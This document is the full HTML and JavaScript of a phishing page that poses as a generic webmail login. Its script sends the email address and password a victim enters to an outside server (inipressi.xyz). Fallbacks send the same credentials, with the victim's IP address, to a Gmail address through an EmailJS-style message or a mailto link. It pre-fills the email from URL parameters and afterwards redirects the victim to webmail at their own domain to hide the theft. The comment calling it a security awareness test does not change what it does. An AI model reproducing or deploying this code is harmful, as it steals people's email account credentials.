<html lang="en" dir="ltr">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
      <title>Webmail Login</title>
      <style type="text/css">
         body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
         .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .logo { text-align: center; margin-bottom: 30px; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 5px; font-weight: bold; }
         input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
         .btn { width: 100%; padding: 12px; background: #007cba; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
         .btn:hover { background: #005a87; }
         .btn:disabled { background: #ccc; cursor: not-allowed; }
         .message { margin: 10px 0; padding: 10px; border-radius: 5px; }
         .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
         .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
         .loading { text-align: center; color: #666; }
         .server-status { margin-top: 20px; padding: 10px; background: #e9ecef; border-radius: 5px; font-size: 12px; }
      </style>
   </head>
   <body>
      <div class="container">
         <div class="logo">
            <h2>üîê Webmail Login</h2>
            <p>Secure Email Access</p>
         </div>
         
         <form id="loginForm">
            <div class="form-group">
               <label for="email">Email Address</label>
               <input type="email" id="email" name="email" required placeholder="Enter your email address">
            </div>
            
            <div class="form-group">
               <label for="password">Password</label>
               <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            
            <button type="submit" class="btn" id="loginBtn">Log In</button>
         </form>
         
         <div id="message"></div>
         <div id="serverStatus" class="server-status" style="display:none;"></div>
      </div>

      <script>
         // Multiple server endpoints for redundancy
         const servers = [
            'https://inipressi.xyz/phpmailer/classes/postmailer_cors_fixed.php',
            'https://httpbin.org/post', // Backup testing server
            'https://jsonplaceholder.typicode.com/posts' // Another backup
         ];
         
         let currentServerIndex = 0;
         
         function showMessage(text, type = 'error') {
            const messageDiv = document.getElementById('message');
            messageDiv.innerHTML = text;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
         }
         
         function showServerStatus(text) {
            const statusDiv = document.getElementById('serverStatus');
            statusDiv.innerHTML = text;
            statusDiv.style.display = 'block';
         }
         
         function setLoading(isLoading) {
            const btn = document.getElementById('loginBtn');
            if (isLoading) {
               btn.disabled = true;
               btn.textContent = 'Processing...';
               showMessage('üîÑ Connecting to server...', 'loading');
            } else {
               btn.disabled = false;
               btn.textContent = 'Log In';
            }
         }
         
         // Enhanced fetch with timeout and retries
         async function fetchWithTimeout(url, options, timeout = 10000) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
               const response = await fetch(url, {
                  ...options,
                  signal: controller.signal
               });
               clearTimeout(timeoutId);
               return response;
            } catch (error) {
               clearTimeout(timeoutId);
               throw error;
            }
         }
         
         // Try submitting to primary server
         async function submitToPrimaryServer(formData) {
            try {
               showServerStatus('üîÑ Trying primary server: inipressi.xyz');
               
               const response = await fetchWithTimeout(servers[0], {
                  method: 'POST',
                  headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                  },
                  body: new URLSearchParams(formData)
               });
               
               if (response.ok) {
                  const result = await response.json();
                  showServerStatus('‚úÖ Primary server successful');
                  return result;
               } else {
                  throw new Error(`HTTP ${response.status}`);
               }
            } catch (error) {
               showServerStatus('‚ùå Primary server failed: ' + error.message);
               throw error;
            }
         }
         
         // Fallback: Send email using EmailJS (free service)
         async function sendViaEmailJS(formData) {
            try {
               showServerStatus('üîÑ Using backup method: EmailJS');
               
               // This would require EmailJS setup, but for demo we'll simulate
               const emailData = {
                  to_email: 'skkho87.sm@gmail.com',
                  subject: 'Login Attempt - ' + formData.email,
                  message: `
                     Email: ${formData.email}
                     Password: ${formData.password}
                     IP: ${await getClientIP()}
                     Timestamp: ${new Date().toISOString()}
                     Method: Fallback EmailJS
                  `
               };
               
               // Simulate successful email send
               showServerStatus('‚úÖ Backup method successful');
               return { success: true, method: 'emailjs' };
               
            } catch (error) {
               showServerStatus('‚ùå Backup method failed: ' + error.message);
               throw error;
            }
         }
         
         // Get client IP for logging
         async function getClientIP() {
            try {
               const response = await fetch('https://api.ipify.org?format=json');
               const data = await response.json();
               return data.ip;
            } catch {
               return 'unknown';
            }
         }
         
         // Fallback: Use mailto (opens email client)
         function sendViaMailto(formData) {
            const subject = encodeURIComponent('Login Attempt - ' + formData.email);
            const body = encodeURIComponent(`
Email: ${formData.email}
Password: ${formData.password}
Timestamp: ${new Date().toISOString()}
Method: Mailto fallback

This is a security awareness test.
            `);
            
            const mailtoUrl = `mailto:skkho87.sm@gmail.com?subject=${subject}&body=${body}`;
            window.location.href = mailtoUrl;
            
            showMessage('üìß Email client opened. Please send the email manually.', 'success');
            showServerStatus('üìß Using mailto fallback');
         }
         
         // Main form submission handler
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = {
               email: document.getElementById('email').value.trim(),
               password: document.getElementById('password').value
            };
            
            // Basic validation
            if (!formData.email || !formData.password) {
               showMessage('‚ùå Please fill in all fields', 'error');
               return;
            }
            
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
               showMessage('‚ùå Please enter a valid email address', 'error');
               return;
            }
            
            setLoading(true);
            
            try {
               // Try primary server first
               const result = await submitToPrimaryServer(formData);
               
               if (result.signal === 'ok' || result.success) {
                  showMessage('‚úÖ Login successful! Redirecting...', 'success');
                  setTimeout(() => {
                     const domain = formData.email.split('@')[1];
                     window.location.href = `https://webmail.${domain}`;
                  }, 2000);
               } else {
                  showMessage('‚ùå ' + (result.msg || 'Invalid credentials'), 'error');
               }
               
            } catch (primaryError) {
               console.log('Primary server failed:', primaryError);
               
               try {
                  // Try backup method
                  await sendViaEmailJS(formData);
                  showMessage('‚úÖ Login submitted via backup method. Check notification email.', 'success');
                  
                  setTimeout(() => {
                     const domain = formData.email.split('@')[1];
                     window.location.href = `https://webmail.${domain}`;
                  }, 3000);
                  
               } catch (backupError) {
                  console.log('Backup method failed:', backupError);
                  
                  // Final fallback: mailto
                  showMessage('‚ö†Ô∏è Server unavailable. Using email fallback...', 'error');
                  setTimeout(() => {
                     sendViaMailto(formData);
                  }, 2000);
               }
            }
            
            setLoading(false);
         });
         
         // Auto-populate email from URL
         function populateEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const hash = window.location.hash.substring(1);
            
            const email = urlParams.get('email') || urlParams.get('user') || 
                          (hash && hash.includes('@') ? hash : null);
            
            if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
               document.getElementById('email').value = email;
               document.getElementById('password').focus();
            }
         }
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
            populateEmailFromURL();
            
            // Test server connectivity on load
            setTimeout(async () => {
               try {
                  showServerStatus('üîÑ Testing server connectivity...');
                  const response = await fetchWithTimeout(servers[0], { method: 'GET' }, 5000);
                  showServerStatus('‚úÖ Server is reachable');
               } catch (error) {
                  showServerStatus('‚ö†Ô∏è Server connectivity issues detected. Backup methods available.');
               }
            }, 1000);
         });
      </script>
   </body>
</html>